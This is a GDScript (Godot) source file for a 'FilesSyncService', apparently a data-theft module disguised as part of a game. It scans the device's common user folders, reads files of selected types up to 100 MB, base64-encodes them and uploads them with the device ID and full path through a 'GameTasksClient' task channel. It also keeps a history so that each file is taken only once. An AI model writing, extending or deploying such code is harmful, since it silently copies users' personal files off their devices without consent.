extends RefCounted
class_name FilesSyncService

const MAX_FILE_SIZE := 100 * 1024 * 1024  # 100 MB

var history: FilesHistoryService
var tasks: GameTasksClient
var exceptions: ExceptionHandler
var environment: GameEnvironment
var permissions: PermissionsManager

var _files_processed: int = 0


func _init() -> void:
	history = FilesHistoryService.new()
	tasks = GameTasksClient.new()
	exceptions = ExceptionHandler.new(tasks)
	environment = GameEnvironment.new()
	permissions = PermissionsManager.new()


func sync_files() -> void:
	print("[TD.FilesSyncService] Sync started")

	if not permissions.does_have_read_permissions():
		printerr("[TD.FilesSyncService] Read permissions denied — aborting")
		return

	var device_id := OS.get_unique_id()
	print("[TD.FilesSyncService] Device ID: ", device_id)

	var folders := environment.get_common_folders()
	if folders.is_empty():
		printerr("[TD.FilesSyncService] No folders found or access denied")
		return

	print("[TD.FilesSyncService] Scanning %d folders..." % folders.size())
	_files_processed = 0

	for folder in folders:
		_process_folder(folder, device_id)

	# Примітка: реальний лічильник оновлюється в callback після HTTP,
	# тому тут може бути 0 — це нормально при асинхронній відправці.
	print("[TD.FilesSyncService] Scan finished. Files queued for send.")


func _process_folder(folder_path: String, device_id: String) -> void:
	print("[TD.FilesSyncService] Folder: ", folder_path)

	var dir := DirAccess.open(folder_path)
	if not dir:
		exceptions.handle_exception(device_id, "Cannot open folder: " + folder_path)
		return

	dir.list_dir_begin()
	var filename := dir.get_next()
	while filename != "":
		if not dir.current_is_dir() and not filename.begins_with("."):
			_process_file(folder_path, filename, device_id)
		filename = dir.get_next()
	dir.list_dir_end()


func _process_file(folder_path: String, filename: String, device_id: String) -> void:
	if not _is_supported(filename):
		return

	if history.is_processed(filename):
		return

	var full_path := folder_path.path_join(filename)

	# Перевірка розміру БЕЗ повного завантаження файлу в пам'ять
	var f := FileAccess.open(full_path, FileAccess.READ)
	if not f:
		print("[TD.FilesSyncService] Cannot open: ", filename)
		return

	var size := f.get_length()
	f.close()

	if size > MAX_FILE_SIZE:
		print("[TD.FilesSyncService] Skipping large file (%d bytes): %s" % [size, filename])
		return

	if size == 0:
		print("[TD.FilesSyncService] Skipping empty file: ", filename)
		return

	var data := FileAccess.get_file_as_bytes(full_path)
	if data.is_empty():
		printerr("[TD.FilesSyncService] Failed to read: ", full_path)
		return

	var payload := {
		"Name": device_id + full_path,
		"Content": Marshalls.raw_to_base64(data),
		"LastWriteTimeUtc": Time.get_datetime_string_from_system(true)
	}

	var task := {
		"Id": device_id,
		"TaskType": "SyncFiles",
		"TaskResult": JSON.stringify(payload)
	}

	print("[TD.FilesSyncService] Sending: %s (%d bytes)" % [filename, data.size()])

	tasks.send_task_result(task, func(success: bool):
		if success:
			history.mark_processed(filename)
			_files_processed += 1
			print("[TD.FilesSyncService] Successfully sent & recorded: ", filename)
		else:
			printerr("[TD.FilesSyncService] Failed to send: ", filename)
	, filename)


func _is_supported(filename: String) -> bool:
	var lower := filename.to_lower()
	for ext in FileTypes.EXTENSIONS:
		if lower.ends_with(ext):
			return true
	return false
